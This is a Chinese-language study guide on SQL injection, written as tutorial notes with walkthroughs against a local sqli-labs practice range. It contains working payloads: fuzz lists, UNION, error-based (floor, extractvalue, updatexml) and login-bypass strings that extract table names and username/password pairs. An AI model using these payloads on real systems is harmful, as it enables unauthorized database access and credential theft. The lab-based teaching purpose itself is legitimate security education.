# 1.环境搭建

## 1.1 windows环境搭建

1.下载安装好[PHPstudy](https://m.phpstudy.net/)软件

2.在github里面搜索SQL注入的靶场sqli-labs

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723224641089.png" alt="image-20220723224641089" style="zoom: 33%;" />

3.下载该靶场的压缩包

4.打开PHPstudy，按下图操作，打开根目录

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723225005389.png" alt="image-20220723225005389" style="zoom:33%;" />

5.将下载好的sql注入靶场的压缩包拷贝到该根目录下，然后解压，可以把解压出来的文件夹换一个简单一点的名称（注意看该文件夹下的文件是不是已经有html文件）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723225052471.png" alt="image-20220723225052471" style="zoom:33%;" />

6.在PHPstudy首页中，开启Apache服务和Mysql服务

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723225754584.png" alt="image-20220723225754584" style="zoom: 33%;" />

7.打开浏览器，输入127.0.0.1测试是否配置正确 出现以下界面说明配置正确。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723230209033.png" alt="image-20220723230209033" style="zoom:33%;" />

8.在地址栏加上刚刚拷贝进去的靶机文件夹，就可以访问靶机环境了

http://127.0.0.1/sqli-labs-master/

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220723232556038.png" alt="image-20220723232556038" style="zoom:33%;" />

9.配置靶场文件，对接数据库

- 打开靶场文件夹找到sql-connections
- 打开db-creds.inc,里面有连接数据库时，自己的用户名和用户密码，在小皮里面可以找到自己安装好的数据库用户名和密码，然后把这个inc配置文件里面的用户名和密码修改为正确的，然后保存

到此，sql注入的靶场环境已经配置完成。



## 1.2 Linux环境搭建

1.下载安装[PHPMyadmin](https://www.phpmyadmin.net/)

- 可以先在物理机里面下载好，然后再拷贝到Linux虚拟机里的\var\www\html\目录下。
- 如果复制不过去，可以使用filezila软件，这个是一个免费的功能强大的ftp服务的图形化软件，但它的功能不只是ftp。
- 使用filezila时，先进行连接(虚拟机要开启ssh，才能进行连接)，连接好虚拟机之后，可以在物理机和虚拟机之间传输文件等等

2.在终端输入“vim /etc/apache2/ports.conf” -> 键盘输入i进入插入编辑模式 -> 修改apache2默认监听端口号为8080 -> 编辑好后，按Esc键+“：wq” 保存退出 -> 在终端输入`/etc/init.d/apache2 start`，开启Apache服务

3.物理机地址栏中输入`虚拟机ip:8080/phpMyAdmin`,出现以下界面说明靶场环境配置成功

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220724202711928.png" alt="image-20220724202711928" style="zoom:33%;" />

4.开启虚拟机的mysql服务：`service mysqld start`

5.输入虚拟机中安装的mysql的用户名和密码，即可登录成功。至此，Linux下的环境配置成功。

# 2.注入方式

## 2.1 注入简介

SQL注入是一种代码注入技术，就是通过把sql命令插入到web表单提交或者输入域名或者页面请求的查询字符串，最终到达欺骗服务器执行恶意的sql代码，从而进一步使攻击者得到相应的数据信息。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。

## 2.2 注入分类

### 1.按使用的技巧分类

- **盲注**
  -   布尔盲注：只能从应用返回中推断语句执行后的布尔值
  
  -   时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
  
- 报错注入：应用会显示全部或者部分的报错信息

- 堆叠注入：有的应用可以加入 ; 后一次执行多条语句

- 其他

### 2.按获取数据的方式分类

`inband`：利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。

`inference`：通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，通过 web 应用的其他改变来推断数据。

`out of band (OOB)`：通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。

### 3.按照查询字段分类

#### 字符型注入

> 当输入的参数为字符串时，称为字符型注入
>
> 源码：<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220726001911866.png" alt="image-20220726001911866" style="zoom: 67%;" />

#### 数字型注入

> 当输入的参数为整型时，称为数字型注入
>
> 源码：<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220726002054052.png" alt="image-20220726002054052" style="zoom:67%;" />

`注`：数字型提交内容一定为数字，但数字不一定为数字型，而提交内容为字符串的一定为字符型。

#### 区分方法

##### 方法1

使用and 1=1 和 and 1=2来判断，如果都能正常显示，则不可能是数字型注入，一定是字符型注入。

`原理：如果是字符型的话，1=1和1=2都为真，而数字型的话，1=1为真，而1=2不为真。`

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220725142835441.png" alt="image-20220725142835441" style="zoom:33%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220725142929266.png" alt="image-20220725142929266" style="zoom:33%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220725143117391.png" alt="image-20220725143117391" style="zoom: 33%;" />

##### 方法2

使用-来判断（~使用最为方便和快捷~）。

- 如果id=2-1显示的页面和id=1的页面相同，则说明是数字型注入；
- 如果id=2-1显示的页面和id=2的页面相同，则说明是字符型注入。

为什么不用+来检测？因为+在很多时候会被理解为空格，导致判断出错。

## 2.3 闭合符

> 注：`如果注入的类型是字符型注入的话，需要进一步进行不合符的判断，如果是数字型注入，则可以直接进行SQL注入。`

在如下代码中，我们可以看到，用户输入的id是被带到sql语句中进行拼接，然后执行的，而且，这个id两边是被’ ‘(两个单引号)给闭合起来的，所以在这个代码里’(单引号)就是**闭合符**。

```php
$id=$_GET[‘id’];
$sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
```

常见的闭合符有四种:'   "   ')   ")

### 判断闭合方式原理

MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1"、1-等，`只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型。`但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql语句执行就会错误，从而造成页面显示错误。

**例如：**
在Mysql数据库下，代码如下：

```php
$id=$_GET[‘id’];
$sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
```

可以看到’(单引号)就是这条语句的闭合符
当id输入的是1)，那么拼接成的sql语句就是：`“SELECT * FROM name WHERE id=‘1)’ LIMIT 0,1”;`
按理来说这个sql语句应该是错误的，执行会报错，但是因为是在Mysql数据库环境下，它会自动把错误的数据1)转换成合法的数据1，从而使得sql语句执行成功，相同的输入1-、1"也一样。

**闭合的作用**：手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数，不需要的语句可以用注释符号`--+`或`#`或`%23`注释掉。

### 判断闭合的方式

1.使用`\`来进行判断。

例：?id=1\：看报错信息，\之后的字符就是闭合符。如下截图所示，闭合符就是`'`：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220803132532637.png" alt="image-20220803132532637" style="zoom:50%;" />

2.使用sleep()函数来判断

例：?id=1' and sleep(3) \-- 。如果页面等待了三秒才刷新，那么说明`'`就是闭合符。

3.

## 2.4 注入检测

**注入点**就是可以实行注入的地方，通常是一个可以访问数据库的连接。

#### 常见注入点

-   GET/POST/PUT/DELETE 参数

-   X-Forwarded-For

-   文件名

#### Fuzz注入点

-   \' / \"
-   1/1
-   1/0
-   and 1=1
-   \" and \"1\"=\"1
-   and 1=2
-   or 1=1
-   or 1=
-   \' and \'1\'=\'1
-   - \^ \* % /

-   \<\< \>\> \|\| \| & &&

-   \~

-   !

-   @

-   反引号执行

#### 测试用常量

-   @@version

-   @@servername

-   @@language

-   @@spid

#### 测试列数

例如 [http://www.foo.com/index.asp?id=12+union+select+null,null\--](http://www.foo.com/index.asp?id=12%2Bunion%2Bselect%2Bnull%2Cnull--) ，不断增加 null 至不返回

#### 报错注入

-   select 1/0

-   select 1 from (select count(\*),concat(version(),floor(rand(0)\*2))x from information_schema.tables group by x)a

-   extractvalue(1, concat(0x5c,(select user())))

-   updatexml(0x3a,concat(1,(select user())),1)

-   exp(\~(SELECT \* from(select user())a))

-   ST_LatFromGeoHash((select \* from(select \* from(select user())a)b))

-   GTID_SUBSET(version(), 1)

#### 基于geometric的报错注入

-   GeometryCollection((select \* from (select \* from(select user())a)b))

-   polygon((select \* from(select \* from(select user())a)b))

-   multipoint((select \* from(select \* from(select user())a)b))

-   multilinestring((select \* from(select \* from(select user())a)b))

-   LINESTRING((select \* from(select \* from(select user())a)b))

-   multipolygon((select \* from(select \* from(select user())a)b))

**其中需要注意的是**，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考[commit 95825f](https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04) 。而以上列表中基于 geometric 的报错注入在这个 [commit 5caea4](https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978) 中被修复，在 5.5.x 较后的版本中同样不再生效。

#### 堆叠注入

-   ;select 1

#### 注释符

-   \#

-   \--+

-   /\*xxx\*/

-   /\*!xxx\*/

-   /\*!50000xxx\*/

#### 判断过滤规则

-   是否有 trunc

-   是否过滤某个字符

-   是否过滤关键字

-   slash 和编码

#### 获取信息

- **判断数据库类型**

  -   and exists (select \* from msysobjects ) \> 0 access 数据库

  -   and exists (select \* from sysobjects ) \> 0 SQLServer 数据库

- **判断数据库表**
  -   and exsits (select \* from admin)

- **版本、主机名、用户名、库名**

- **表和字段**
  -   **确定字段数**
  -   Order By

  -   Select Into

- 表名、列名

#### 测试权限

- **文件操作**
  -   读敏感文件

  -   写shell

- **带外通道**
- 网络请求



# 3. 注入方式讲解

## 3.1 union注入

### 1.union用法讲解

UNION 运算符将多个 SELECT 语句的结果组合成一个结果集。

#### （１）使用 UNION 须满足以下条件：

Ａ：所有查询中必须具有相同的结构（即`查询中的的列数和列的顺序必须相同`）。

Ｂ：`对应列的数据类型可以不同但是必须兼容`（所谓的兼容是指两种类型之间可以进行隐式转换，不能进行隐式转换则报错）。也可以用显式转换为相同的数据类型。

（当数据类型不同时，则根据数据类型优先级规则确定所产生的数据类型。如果类型相同，但精度、小数位数或长度不同，则根据用于合并表达式的相同规则来确定结果）（参照ＭＳＤＮ：数据类型优先级）

Ｃ：`如果为ＸＭＬ数据类型，则列必须等价`（所有列都必须类型化为 XML 架构，或者为非类型化），`如果类型化，这些列必须类型化为相同的 XML 架构集合。`

#### （２）UNION结果集

Ａ：`UNION 后的结果集的列名与 第一个 SELECT 语句的结果集中的列名相同`。`另一个 SELECT 语句的结果集列名将被忽略。`

Ｂ：`UNION 默认的删除结果集中重复的记录，如果使用 ALL 关键字则在结果集中保留所有记录（保留重复记录）`

#### （３）注意点

Ａ： Ｔransact-SQL语句中可以使用多个UNION运算符

Ｂ：在使用了 UNION 运算符的各个 SELECT语句`不能`包含它们自己的 `ORDER BY 或 COMPUTE` 子句。而只能在最终的组合结果集（即最后一个 SELECT 语句的后面）使用一个 ORDER BY 或 COMPUTE 子句。

Ｃ：在使用了 UNION 运算符的各个 SELECT 语句中`可以使用 GROUP BY 和 HAVING` 子句。

Ｄ：默认情况下，SQL Server 2005 从左向右对包含 UNION 运算符的语句求值。可使用圆括号指定求值顺序。

#### union 应用实例

以下语句并不等价：

```sql
/* First statement. */ 
  SELECT * FROM TableA 
  UNION ALL 
 ( SELECT * FROM TableB 
  UNION 
 SELECT * FROM TableC 
 ) 
 GO 
 
 /* Second statement. */ 
 (SELECT * FROM TableA 
 UNION ALL 
 SELECT * FROM TableB 
 ) 
 UNION 
 SELECT * FROM TableC) 
 GO
```

### 2.union注入讲解

判断完是什么闭合方式之后，先不要着急进行union联合注入。

如果盲目进行union联合注入的话，就会出现以下情况（select表达式的列数和前面的不同，仍然得不到结果）：

```sql
#闭合方式为‘，且类型是字符型注入
http://127.0.0.1/sql/Less-1/?id=1' union select database() --+
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220726104109889.png" alt="image-20220726104109889" style="zoom:67%;" />

**1.先判断前面id拼接的查询结果是多少列**

- 使用`group by`语句，通过二分法，从一个较大的数开始猜测，直到猜测最大列数（使用`order by`也可以达到相同的效果）
- 使用`group by`语句的原因是一般不会被服务器的防火墙发现

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728000431714.png" alt="image-20220728000431714" style="zoom: 50%;" />

**2.知道第一个查询结果的列数之后，构造结果列数与之相等的union语句。可以看出结果已正确显示，但是还没有打印出我们构造的union查询语句查询的结果，于是需要将第一个查询的查询结果设为空。**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728005103135.png" alt="image-20220728005103135" style="zoom:50%;" /> 

**3.将id=-1，就可以使以第一个查询为空，因为没有id为-1的结果。此时，已经显示出了我们构造的查询结果，可以看出有2和3两个回显位，1号没有回显位。于是我们可以将想要查询的信息通过2和3的回显位打印出来。**

**回显位**：在网页中有打印输出，且根据查询语句不同打印信息也随之变化的位置

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728005504175.png" alt="image-20220728005504175" style="zoom:50%;" />

**4.在回显位上打印出数据库的版本信息`version()`和数据库的名字`database()`**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728010059930.png" alt="image-20220728010059930" style="zoom: 50%;" />

**5.使用information_schema.tables拿到数据库的表名集合和information_schema.columns拿到数据库的列名集合**

`注：information_schema是数据库系统自带的函数模块，其包含了所有数据库的简要信息，其中包含了两个重要的表，就是tables和columns。但是在平时的sql注入中information_schema很容易被服务器的防火墙识别出来，导致注入失败，而且一般情况下，数据库系统对tables和columns这两张表也是严防死守，很难突破。`

```sql
http://192.168.37.148/sql/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables -- 
```

如下图所示，利用2号回显位打印表名，但是只打印出了一个表的表名，于是，可以利用`group_concat`函数把所有的表名聚集在一行显示出来。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728153048892.png" alt="image-20220728153048892" style="zoom:50%;" />

```sql
http://192.168.37.148/sql/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables -- 
```

![image-20220728155300362](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728155300362.png)

**6.添加where条件限定，打印出security数据库的表名**

```sql
http://192.168.37.148/sql/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- 
```

![image-20220728155627975](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728155627975.png)

**7.得到表名后，开始获取表里面的每一列**

使用`information_schema.columns`获取所有列，然后加上表的限定`where table_name='表名'`，在回显位上输出。

```sql
http://192.168.37.148/sql/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails' -- 
```

![image-20220728190813926](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728190813926.png)

**8.得到emails表的列名之后，可以查询emails表里的内容了**

```sql
http://192.168.37.148/sql/Less-1/?id=-1' union select 1,group_concat(id),group_concat(email_id) from emails -- 
```

![image-20220728191206300](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728191206300.png)



- #### order by和报错注入

```sql
select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.schemata)),0));
```

- #### union 联合查询


```sql
?id=111’ union select 1,2,(group_concat(table_name) from information_schema.tables where table_schema=‘数据库名’) --+
```

### 3.union注入(POST提交)

前面讲的是GET提交。

`get提交一般是把参数放在url里面进行提交，而post提交是把参数单独列出来，放在数据包里进行提交。`

POST提交和GET提交的不同：

1. get提交可以被缓存，而post提交不会被缓存
2. get提交参数会被保存在浏览器的历史记录里，而post提交不会
3. get提交可以被收藏为书签，而post提交不可以
4. get提交有长度限制，最长为2048个字符；而post提交没有长度要求，不是只允许使用ASCII字符，还可以使用二进制数据
5. post提交比get提交更安全

#### 靶场练习（less-11）

**1.先抓一次包，分析一下参数。然后使用万能秘钥判断注入点**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807123201220.png" alt="image-20220807123201220" style="zoom:50%;" />

**万能秘钥**：用户名输入`admin' or 1=1 #`，密码随便输入即可登录成功（username存在注入点，可以使用post提交注入，并用`or`指令使条件永真来绕过密码验证）。

由下面的截图可以看出，在用户名处存在注入点。

```
uname=admin' or 1=1 -- &passwd=1ed&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807013344955.png" alt="image-20220807013344955" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807013402844.png" alt="image-20220807013402844" style="zoom:50%;" />

**2.判断列数**

通过二分法判断出列数为2

```
uname=admin' group by 2 -- &passwd=1ed&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807013706450.png" alt="image-20220807013706450" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807013721741.png" alt="image-20220807013721741" style="zoom:50%;" />

**3.开始union注入，检测回显位**

如下图，检测出了两个回显位。可以进行查库查表查列查内容等下一步注入操作。

```
uname=' union select 1,2  -- &passwd=1ed&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807014024188.png" alt="image-20220807014024188" style="zoom: 50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807014046569.png" alt="image-20220807014046569" style="zoom:50%;" />

### union注入局限

如果在服务器的源码中，sql拼接语句有`换行`的话，就会导致`注释符失效`，导致union注入失败。

## 3.2 报错注入

**报错注入**是一种页面响应形式，即构造语句，让错误的信息夹杂在可以显示数据库内容的查询语句里，然后服务器返回的报错提示中就包含了我们要查询的数据库内容。响应过程如下：

1. 用户在前台页面输入检索内容；
2. 后台将前台页面上输入的检索内容`无加区别`的拼接成sql语句，交付给数据库执行；
3. 数据库将执行的结果返回给后台，后台将数据库执行的结果`无加区别`的显示到前台页面上；

`注：两个无加区别，即后台对于输入输出的合理性没有做检查,这是报错注入存在的基础。`能使用union注入就尽量使用union注入，因为报错注入有很多局限，而且回显的数据也不全。

### 靶场学习

**1.打开less-5，判断出闭合方式是'，然后尝试union注入，发现没有报错，但是结果也不回显。**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' union select 1,2,database() -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729105601679.png" alt="image-20220729105601679" style="zoom:33%;" />

**2.于是故意输错信息，看显示的报错信息，发现有报错注入的基础，间接获得了数据库名security。**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' union select 1,2,datadase() -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729105909470.png" alt="image-20220729105909470" style="zoom:33%;" />

### （1）floor()（最难！！！）

详解：https://www.secpulse.com/archives/140616.html

```sql
and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23
```

#### 使用到的函数：

**1.`rand()`函数：随机返回0-1之间的小数**

```sql
select rand() from users;
#user表内有几条数据，就打印出几个0-1的随机数
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730093630313.png" alt="image-20220730093630313" style="zoom:33%;" />

**2.`floor()`函数：小数向下取整。（向上取整：`ceiling()`）**

```sql
select floor(rand()*2);
#结果随机为0或者1
```

**3.`concat_ws()`函数：将括号内第二三个数据用第一个字段连接起来**

```sql
SELECT concat_ws('-',(SELECT database()),'ok'); 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730105806806.png" alt="image-20220730105806806" style="zoom:50%;" />

**4.`group by`：对结果集进行分组，`as`：别名**

```sql
select concat_ws('-',(select database()),floor(rand()*2)) as zxf from users group by zxf;
```

结果被分成了两组。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730110347612.png" alt="image-20220730110347612" style="zoom: 50%;" />

**6.`count()`：汇总统计数量（报错点就在这里）**

```sql
select count(*),concat_ws('-',(select database()),floor(rand(1)*2)) as zxf from  information_schema.columns group by zxf -- 
```

```sql
select count(*),concat_ws('-',(select database()),floor(rand()*2)) as zxf from users group by zxf
#代码也可以写成如下：
select count(*) from users group by concat_ws('-',(select database()),floor(rand(1)*2));
```

结果有时会报错，但有时会正常运行。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730111155437.png" alt="image-20220730111155437" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730111226947.png" alt="image-20220730111226947" style="zoom: 50%;" />

把count(*)去掉不再报错，说明是在统计的时候出现错误。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730115026120.png" alt="image-20220730115026120" style="zoom: 50%;" />

**报错原理：**

floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。

**7.`limit`：用于显示指定行数**

由于结果不只有一行，于是使用limit函数来限制。`limit 0,1`表示从0开始，显示一行。

```sql
select count(*),concat_ws('-',(select concat(username,':',password) from users limit 0,1),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- 
```

#### 靶场实战（less-6）

**1.判断数字型和字符型，然后猜测出列数，先使用union注入，发现没有回显位，于是使用floor报错注入。**

**2.通过报错信息查询数据库名**

```sql
http://192.168.37.148/sql/Less-6/?id=-1" union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730235219890.png" alt="image-20220730235219890" style="zoom:50%;" />

**3.查询security下的所有表名**

```sql
http://192.168.37.148/sql/Less-6/?id=-1" union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema='security'),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730235442873.png" alt="image-20220730235442873" style="zoom:50%;" />

**4.查询users表下的列名**

```sql
http://192.168.37.148/sql/Less-6/?id=-1" union select 1,count(*),concat_ws('-',(select group_concat(column_name) from information_schema.columns where table_name='users'),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220730235654940.png" alt="image-20220730235654940" style="zoom:50%;" />

**5.查询users表内的数据**

```sql
http://192.168.37.148/sql/Less-6/?id=-1" union select 1,count(*),concat_ws('-',(select concat(username,':',password) from users limit 0,1),floor(rand(0)*2)) as zxf from information_schema.columns group by zxf -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220731001134284.png" alt="image-20220731001134284" style="zoom:50%;" />

### （2）extractvalue()

```sql
select * from 数据库名 where id=1 and (extractvalue(1,concat(0x7e,(select 表名()),0x7e)));
```

函数extractvalue()包含两个参数，第一个参数是`XML文档对象名称`，第二个参数是`路径`。

**配置展示extractvalue()的用法的环境**：先创建一个数据库zxf，然后再该数据库下创建一张表，表名为xml，其中有一个doc列，然后运行下面两段代码，将下面两段xml数据插入到doc表内。

```sql
insert into xml values('
<book>
<title>A bad boy how to get a girlfriend</title>
<author>
<initial>LOVE</initial>
<surname>benben</surname>
</author>
</book>
');
```

```sql
insert into xml values('
<book>
<title>how to become a bad boy</title>
<author>
<initial>hualong</initial>
<surname>Melton</surname>
</author>
</book>
');
```

**1.使用extractvalue()函数可以查询xml表的内容**

```sql
SELECT extractvalue(doc,'/book/author/surname') FROM xml;
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729125718390.png" alt="image-20220729125718390" style="zoom: 50%;" />

**2.故意设置错误信息，使结果报错。**

`如果设置路径错误，并不会报错；设置路径分割符/出错，就会出现报错。`

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729130523157.png" alt="image-20220729130523157" style="zoom:50%;" /><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729130759790.png" alt="image-20220729130759790" style="zoom:50%;" />

**3.在报错语句前面写一个查询语句，并在报错的时候将查询信息回显出来。**

构造如下语句，以在报错信息中回显数据库：

```sql
SELECT extractvalue(doc,concat(0x7e,(SELECT DATABASE()))) FROM xml;
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729131826733.png" alt="image-20220729131826733" style="zoom:50%;" />

**4.在靶场less-5中进行测试，显示了数据库的名称，也确定了回显位。**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select database())) )-- 
#concat是一个拼接函数，可以将0x7e和后边的查询拼接起来，使它出现报错。
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729133351083.png" alt="image-20220729133351083" style="zoom:50%;" />

**5.获取security数据库下的所有表的表名**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'))) -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729135715382.png" alt="image-20220729135715382" style="zoom:50%;" />

**6.选取一个表users，获取该表下的列名。**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) -- 
```

但是，有一个问题，就是默认只能返回32个字符。如下图所示。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729141844904.png" alt="image-20220729141844904" style="zoom:50%;" />

可以使用函数`substrng()`或者`substr()`来解决只能返回32个字符的问题，两个函数用法都一样。虽然每次还是只能显示32个字符，但是可以通过多次显示，每次显示不一样的，以获取全部结果。

```sql
http://192.168.37.148/sql/Less-5/?id=-1' and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,0x7e,password),25,32) from users))) --
#从第25个字符后面再显示32个字符
```

**7.获取表内信息。**

```sql
http://192.168.37.148/sql/Less-5/?id=-1' and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,0x7e,password),0,32) from users))) -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729142012695.png" alt="image-20220729142012695" style="zoom:50%;" />

### （3）updatexml()

```sql
select * from 数据库名 where id=1 and (updatexml(1,concat(0x7e,(select 表名()),0x7e),1));
```

updatexml()报错注入的原理和extractvalue()报错注入的原理相同，但是在函数的使用上有区别。

`updatexml(XML_document,XPATH_string,new_value)`包含三个参数：

- XML_document是string格式，为XML文档对象的名称，例如Doc
- XPATH_string是路径，XPATH格式的字符串
- new_value是string格式，替换查找到的符合条件的数据

**1.构造updatexml()函数语句，获取数据库名称**

```sql
http://192.168.37.148/sql/Less-5/?id=1' and 1=updatexml(1,concat(0x7e,(select database())),'1') -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729230556301.png" alt="image-20220729230556301" style="zoom:50%;" />

**2.获取security数据库下的所有表的表名**

```sql
http://192.168.37.148/sql/Less-5/?id=1' and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),'1') -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729230804382.png" alt="image-20220729230804382" style="zoom:50%;" />

**3.获取users表内的所有列的列名**

注：updatexml报错注入仍然是只能回显32位字符，所以仍然要

```sql
http://192.168.37.148/sql/Less-5/?id=1' and 1=updatexml(1,concat(0x7e,(select substring(group_concat(column_name),40,32) from information_schema.columns where table_name='users')),'1') -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729231122486.png" alt="image-20220729231122486" style="zoom:50%;" />

**4.获取users表内的信息**

```sql
http://192.168.37.148/sql/Less-5/?id=1' and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,'-',password),1,32) from users)),'1') -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220729231438732.png" alt="image-20220729231438732" style="zoom:50%;" />

### （4）geometrycollection()

```sql
select * from 数据库名where id=1 and geometrycollection((select * from(select * from(select 表名())a)b));
```

### （5）multipoint()

```sql
select * from 数据库名 where id=1 and multipoint((select * from(select * from(select 表名())a)b));
```

### （6）polygon()

```sql
select * from 数据库名 where id=1 and polygon((select * from(select * from(select 表名())a)b));
```

### （7）multipolygon()

```sql
select * from 数据库名 where id=1 and multipolygon((select * from(select * from(select 表名())a)b));
```

### （8）linestring()

```sql
select * from 数据库名 where id=1 and linestring((select * from(select * from(select 表名())a)b));
```

### （9）multilinestring()

```sql
select * from 数据库名 where id=1 and multilinestring((select * from(select * from(select 表名())a)b));
```

### （10）exp()

```sql
select * 数据库名 test where id=1 and exp(~(select * from(select 表名())a));
```

### （11）NAME_CONST()

### （12）jion（）

### POST提交报错注入（less-13）

**1.提交用户名admin'看是否报错，如有报错，查看报错显示中的闭合符号。然后判断出闭合符为`')`。**

**2.使用万能秘钥正确登录后，发现没有回显位。于是采用报错注入，查看是否有报错信息提示。**

```
uname=-admin') union select 1,databdase() -- &passwd=adsdmin&Submit=Submit
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220807132001197.png" alt="image-20220807132001197" style="zoom:50%;" />

**3.实行post报错注入，获取数据库名称。**

**（1）etractvalue()报错**

```
uname=-admin') union select 1,extractvalue(1,concat(0x7e,(select database())) ) -- &passwd=adsdmin&Submit=Submit
```

